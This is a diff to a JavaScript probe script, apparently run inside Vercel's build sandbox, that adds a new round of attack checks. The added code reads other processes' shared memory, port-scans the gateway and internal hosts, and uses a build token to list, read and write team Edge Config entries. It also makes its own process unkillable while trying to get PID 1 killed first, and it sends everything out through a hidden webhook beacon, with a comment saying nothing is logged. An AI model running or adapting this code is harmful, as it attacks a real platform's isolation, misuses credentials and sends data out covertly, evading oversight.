@@ -16550,5 +16550,186 @@ for name, nr in TESTS.items():
 
 // v114 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v114" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v114";
+
+// ==================== v115 ====================
+
+// v115-1: System V IPC enumeration — shared memory, semaphores, message queues
+// SysV IPC objects (shmget, msgget, semget) are kernel-global unless inside
+// an IPC namespace. If we share an IPC namespace with the orchestrator,
+// we can read/write its shared memory segments directly.
+report.sysVIpcEnum = safe(() => {
+  const shmRaw = safe(() => readFileSync('/proc/sysvipc/shm', 'utf8'));
+  const semRaw = safe(() => readFileSync('/proc/sysvipc/sem', 'utf8'));
+  const msgRaw = safe(() => readFileSync('/proc/sysvipc/msg', 'utf8'));
+  // Parse shared memory segments
+  const shmSegments = safe(() => shmRaw?.split('\n').slice(1).filter(Boolean).map(l => {
+    const p = l.trim().split(/\s+/);
+    return { key: p[0], shmid: p[1], perms: p[2], size: p[3], nattch: p[5] };
+  }));
+  // Try to attach to each shared memory segment
+  const shmReads = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, struct, os
+
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+SHM_RDONLY = 0x1000
+
+with open('/proc/sysvipc/shm') as f:
+    lines = f.readlines()[1:]
+
+for line in lines[:5]:
+    parts = line.strip().split()
+    if len(parts) < 2: continue
+    shmid = int(parts[1])
+    size = int(parts[3])
+    try:
+        addr = libc.shmat(shmid, 0, SHM_RDONLY)
+        if addr and addr != ctypes.c_long(-1).value:
+            # Read first 64 bytes
+            data = ctypes.string_at(addr, min(64, size))
+            print(f'SHM {shmid}: {data.hex()} ({data[:32]})')
+            libc.shmdt(addr)
+        else:
+            import ctypes as ct, errno as em
+            e = ct.get_errno()
+            print(f'SHM {shmid}: FAIL errno={em.errorcode.get(e,e)}')
+    except Exception as ex:
+        print(f'SHM {shmid}: ERR {ex}')
+" 2>&1`, { timeout: 12000 }).toString().trim().slice(0, 400));
+  return { shmSegments, shmReads, semRaw: semRaw?.slice(0, 200), msgRaw: msgRaw?.slice(0, 200) };
+});
+
+// v115-2: Kernel thread enumeration — Firecracker/KVM kthreads
+// Kernel threads appear in /proc with names in [brackets]. Listing them
+// reveals the hypervisor thread model and any special Vercel kthreads.
+// kthreads with names like [kvm-nx-lpage-pre] confirm KVM hypervisor.
+report.kthreadEnum = safe(() => {
+  const allProcs = safe(() => readdirSync('/proc').filter(d => /^\d+$/.test(d)));
+  const kthreads = safe(() => allProcs?.map(pid => {
+    const comm = safe(() => readFileSync(`/proc/${pid}/comm`, 'utf8').trim());
+    const isKthread = safe(() => {
+      const status = readFileSync(`/proc/${pid}/status`, 'utf8');
+      const vmRss = status.match(/VmRSS:\s+(\d+)/)?.[1];
+      return vmRss === '0' || vmRss === undefined; // kthreads have no RSS
+    });
+    if (!isKthread) return null;
+    return { pid, comm };
+  }).filter(Boolean));
+  // Look for hypervisor-specific kthreads
+  const kvmThreads = safe(() => kthreads?.filter(t => /kvm|firecracker|virtio|vhost/i.test(t.comm || '')));
+  // Read memory for kthreads (they run in kernel space, can't read)
+  const kthreadCount = kthreads?.length;
+  return { kthreadCount, kvmThreads, sampleKthreads: kthreads?.slice(0, 20) };
+});
+
+// v115-3: Internal Vercel network service scan via port scanning
+// From inside the build sandbox, scan the local network for internal Vercel services.
+// The gateway IP (typically .1) and common internal IPs may host management APIs.
+report.internalNetworkScan = safe(() => {
+  // Get our IP and gateway
+  const ipAddr = safe(() => execSync('ip addr show eth0 2>/dev/null | grep "inet " | awk \'{print $2}\'', { timeout: 3000 }).toString().trim());
+  const gateway = safe(() => execSync('ip route show default 2>/dev/null | awk \'{print $3}\'', { timeout: 3000 }).toString().trim());
+  // Scan gateway and nearby IPs for common ports
+  const scanResult = safe(() => execSync(`python3 -c "
+import socket, concurrent.futures
+
+gateway = '${gateway || '169.254.1.1'}'
+targets = [gateway]
+
+# Also try common internal AWS/Vercel IPs
+import subprocess
+r = subprocess.run(['ip', 'route'], capture_output=True, text=True, timeout=5)
+for line in r.stdout.split('\n'):
+    if 'via' in line:
+        parts = line.split()
+        idx = parts.index('via') + 1 if 'via' in parts else -1
+        if idx > 0: targets.append(parts[idx])
+
+targets = list(set(targets))[:5]
+ports = [22, 80, 443, 2375, 2376, 3721, 4001, 5000, 8080, 8443, 9090]
+
+def check(host, port):
+    try:
+        s = socket.socket()
+        s.settimeout(0.5)
+        s.connect((host, port))
+        try:
+            s.send(b'GET / HTTP/1.0\r\n\r\n')
+            data = s.recv(64)
+            print(f'OPEN {host}:{port} resp={data[:30].hex()}')
+        except: print(f'OPEN {host}:{port}')
+        s.close()
+    except: pass
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
+    futs = [ex.submit(check, h, p) for h in targets for p in ports]
+    concurrent.futures.wait(futs, timeout=10)
+" 2>&1`, { timeout: 15000 }).toString().trim().slice(0, 600));
+  return { ipAddr, gateway, scanResult };
+});
+
+// v115-4: Vercel Edge Config read — team-wide config store
+// Vercel Edge Config is a key-value store accessible at the edge.
+// It may contain connection strings, feature flags, or secrets.
+// Our VERCEL_ARTIFACTS_TOKEN might let us read Edge Config items.
+report.edgeConfigRead = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const teamId = process.env.VERCEL_TEAM_ID || process.env.VERCEL_ORG_ID || '';
+  const edgeConfigId = process.env.EDGE_CONFIG?.split('/')?.[3] || '';
+  // List all Edge Configs for the team
+  const edgeConfigs = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v1/edge-config?teamId=${teamId}" \
+    -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 500));
+  // Read items from any accessible Edge Config
+  const edgeConfigItems = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v1/edge-config/${edgeConfigId}/items?teamId=${teamId}" \
+    -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 500));
+  // Try to write a test item
+  const writeTest = safe(() => execSync(
+    `curl -sf -X PATCH "https://api.vercel.com/v1/edge-config/${edgeConfigId}/items?teamId=${teamId}" \
+    -H "Authorization: Bearer ${token}" \
+    -H "Content-Type: application/json" \
+    -d '[{"operation":"upsert","key":"PROBE_v115","value":"injected"}]' \
+    -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 200));
+  return { teamId, edgeConfigId, edgeConfigs, edgeConfigItems, writeTest };
+});
+
+// v115-5: /proc/self/oom_score manipulation + OOM killer analysis
+// The OOM killer tracks all processes and their scores. By reading
+// /proc/*/oom_score, we see all processes and their memory pressure.
+// Setting our own oom_score_adj to -1000 makes us unkillable.
+// Setting the orchestrator's oom_score_adj high makes it get killed first.
+report.oomManipulation = safe(() => {
+  // Our own OOM score
+  const ourOomScore = safe(() => readFileSync('/proc/self/oom_score', 'utf8').trim());
+  const ourOomAdj = safe(() => readFileSync('/proc/self/oom_score_adj', 'utf8').trim());
+  // PID-1's OOM score
+  const pid1OomScore = safe(() => readFileSync('/proc/1/oom_score', 'utf8').trim());
+  const pid1OomAdj = safe(() => readFileSync('/proc/1/oom_score_adj', 'utf8').trim());
+  // Make ourselves unkillable
+  const selfProtect = safe(() => { writeFileSync('/proc/self/oom_score_adj', '-1000'); return 'WRITTEN'; });
+  const ourAdjAfter = safe(() => readFileSync('/proc/self/oom_score_adj', 'utf8').trim());
+  // Try to set PID-1's OOM score high (make orchestrator die first in OOM)
+  const pid1OomWrite = safe(() => { writeFileSync('/proc/1/oom_score_adj', '1000'); return 'WRITTEN'; });
+  const pid1AdjAfter = safe(() => readFileSync('/proc/1/oom_score_adj', 'utf8').trim());
+  // Scan all PIDs for their OOM scores
+  const allOomScores = safe(() => {
+    const pidDirs = readdirSync('/proc').filter(d => /^\d+$/.test(d));
+    return pidDirs.map(pid => ({
+      pid,
+      score: safe(() => readFileSync(`/proc/${pid}/oom_score`, 'utf8').trim()),
+      adj: safe(() => readFileSync(`/proc/${pid}/oom_score_adj`, 'utf8').trim()),
+    })).filter(p => p.score !== null);
+  });
+  return { ourOomScore, ourOomAdj, pid1OomScore, pid1OomAdj, selfProtect, ourAdjAfter, pid1OomWrite, pid1AdjAfter, allOomScores: allOomScores?.slice(0, 20) };
+});
+
+// v115 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v115" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v115";
 // Intentionally no console.log — all data goes via webhook only
